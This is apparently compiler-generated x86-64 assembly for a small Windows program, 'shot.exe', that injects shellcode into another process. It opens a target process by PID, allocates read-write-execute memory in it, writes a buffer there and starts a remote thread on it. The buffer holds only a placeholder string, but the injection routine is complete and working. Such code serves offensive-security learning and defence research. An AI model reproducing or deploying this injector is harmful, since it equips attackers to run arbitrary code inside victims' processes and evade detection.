	.file	"shot.c"
	.text
	.globl	PID
	.bss
	.align 4
PID:
	.space 4
	.globl	TID
	.align 4
TID:
	.space 4
	.globl	hProcess
	.align 8
hProcess:
	.space 8
	.globl	hThread
	.align 8
hThread:
	.space 8
	.globl	rBuffer
	.align 8
rBuffer:
	.space 8
	.globl	vomit
	.data
	.align 32
vomit:
	.ascii "This is where your shellcode goes!\0"
	.def	__main;	.scl	2;	.type	32;	.endef
	.section .rdata,"dr"
	.align 8
.LC0:
	.ascii "\12(*) Usage:\12\11shot.exe <PID> | open handle to process\12\11shot.exe | shows usage menu\12\0"
	.align 8
.LC1:
	.ascii "\12[-] Invalid PID | PID returned 0\12\11(Error: %ld)\12\11For usage, try: shot.exe\12\12\0"
	.align 8
.LC2:
	.ascii "\12[~] Attempting to open a handle to process (PID: %ld)\12\0"
	.align 8
.LC3:
	.ascii "\12[-] Failed to open handle to the process (PID: %ld)\12\11(Error: %ld)\12\12\0"
	.align 8
.LC4:
	.ascii "\12[+] Handle to process opened\12\11PID: %ld\12\11HANDLE: 0x%p\12\0"
	.align 8
.LC5:
	.ascii "\12[~] Allocating %zu bytes with rwx permissions\12\0"
	.align 8
.LC6:
	.ascii "\12[-] Failed to write to process memory\12\11(Error: %ld)\12\12\0"
	.align 8
.LC7:
	.ascii "\12[+] Wrote to process memory\12\11PID: %ld\12\11HANDLE: 0x%p\12\11BYTES: %zu bytes\12\0"
	.align 8
.LC8:
	.ascii "\12[-] Failed to get a handle to the thread, closing process handle\12\11PID: %ld\12\11HANDLE: 0x%p\12\11(Error: %ld)\12\12\0"
.LC9:
	.ascii "\12Cleaning up...\0"
.LC10:
	.ascii "\12Cleaning finished\12\0"
	.text
	.globl	main
	.def	main;	.scl	2;	.type	32;	.endef
	.seh_proc	main
main:
	pushq	%rbp
	.seh_pushreg	%rbp
	movq	%rsp, %rbp
	.seh_setframe	%rbp, 0
	subq	$64, %rsp
	.seh_stackalloc	64
	.seh_endprologue
	movl	%ecx, 16(%rbp)
	movq	%rdx, 24(%rbp)
	call	__main
	cmpl	$1, 16(%rbp)
	jg	.L2
	leaq	.LC0(%rip), %rax
	movq	%rax, %rcx
	call	puts
	movl	$0, %eax
	jmp	.L3
.L2:
	movq	24(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movq	%rax, %rcx
	call	atoi
	movl	%eax, PID(%rip)
	movl	PID(%rip), %eax
	testl	%eax, %eax
	jne	.L4
	movq	__imp_GetLastError(%rip), %rax
	call	*%rax
	movl	%eax, %edx
	leaq	.LC1(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movl	$1, %eax
	jmp	.L3
.L4:
	movl	PID(%rip), %eax
	movl	%eax, %edx
	leaq	.LC2(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movl	PID(%rip), %eax
	movl	%eax, %r8d
	movl	$0, %edx
	movl	$2097151, %ecx
	movq	__imp_OpenProcess(%rip), %rax
	call	*%rax
	movq	%rax, hProcess(%rip)
	movq	hProcess(%rip), %rax
	testq	%rax, %rax
	jne	.L5
	movq	__imp_GetLastError(%rip), %rax
	call	*%rax
	movl	%eax, %edx
	movl	PID(%rip), %eax
	movl	%edx, %r8d
	movl	%eax, %edx
	leaq	.LC3(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movl	$1, %eax
	jmp	.L3
.L5:
	movq	hProcess(%rip), %rdx
	movl	PID(%rip), %eax
	movq	%rdx, %r8
	movl	%eax, %edx
	leaq	.LC4(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movq	hProcess(%rip), %rax
	movl	$64, 32(%rsp)
	movl	$12288, %r9d
	movl	$35, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	movq	__imp_VirtualAllocEx(%rip), %rax
	call	*%rax
	movq	%rax, rBuffer(%rip)
	movl	$35, %edx
	leaq	.LC5(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movq	rBuffer(%rip), %rdx
	movq	hProcess(%rip), %rax
	movq	$0, 32(%rsp)
	movl	$35, %r9d
	leaq	vomit(%rip), %r8
	movq	%rax, %rcx
	movq	__imp_WriteProcessMemory(%rip), %rax
	call	*%rax
	testl	%eax, %eax
	jne	.L6
	movq	__imp_GetLastError(%rip), %rax
	call	*%rax
	movl	%eax, %edx
	leaq	.LC6(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movl	$1, %eax
	jmp	.L3
.L6:
	movq	hProcess(%rip), %rdx
	movl	PID(%rip), %eax
	movl	$35, %r9d
	movq	%rdx, %r8
	movl	%eax, %edx
	leaq	.LC7(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movq	rBuffer(%rip), %rax
	movq	%rax, %rcx
	movq	hProcess(%rip), %rax
	leaq	TID(%rip), %rdx
	movq	%rdx, 48(%rsp)
	movl	$0, 40(%rsp)
	movq	$0, 32(%rsp)
	movq	%rcx, %r9
	movl	$0, %r8d
	movl	$0, %edx
	movq	%rax, %rcx
	movq	__imp_CreateRemoteThread(%rip), %rax
	call	*%rax
	movq	%rax, hThread(%rip)
	movq	hThread(%rip), %rax
	testq	%rax, %rax
	jne	.L7
	movq	__imp_GetLastError(%rip), %rax
	call	*%rax
	movl	%eax, %edx
	movq	hProcess(%rip), %rcx
	movl	PID(%rip), %eax
	movl	%edx, %r9d
	movq	%rcx, %r8
	movl	%eax, %edx
	leaq	.LC8(%rip), %rax
	movq	%rax, %rcx
	call	printf
	movq	hProcess(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	movl	$1, %eax
	jmp	.L3
.L7:
	movq	hThread(%rip), %rax
	movl	$-1, %edx
	movq	%rax, %rcx
	movq	__imp_WaitForSingleObject(%rip), %rax
	call	*%rax
	leaq	.LC9(%rip), %rax
	movq	%rax, %rcx
	call	puts
	movq	hThread(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	movq	hProcess(%rip), %rax
	movq	%rax, %rcx
	movq	__imp_CloseHandle(%rip), %rax
	call	*%rax
	leaq	.LC10(%rip), %rax
	movq	%rax, %rcx
	call	puts
	movl	$0, %eax
.L3:
	addq	$64, %rsp
	popq	%rbp
	ret
	.seh_endproc
	.ident	"GCC: (MinGW-W64 x86_64-ucrt-mcf-seh, built by Brecht Sanders) 13.1.0"
	.def	puts;	.scl	2;	.type	32;	.endef
	.def	atoi;	.scl	2;	.type	32;	.endef
	.def	printf;	.scl	2;	.type	32;	.endef
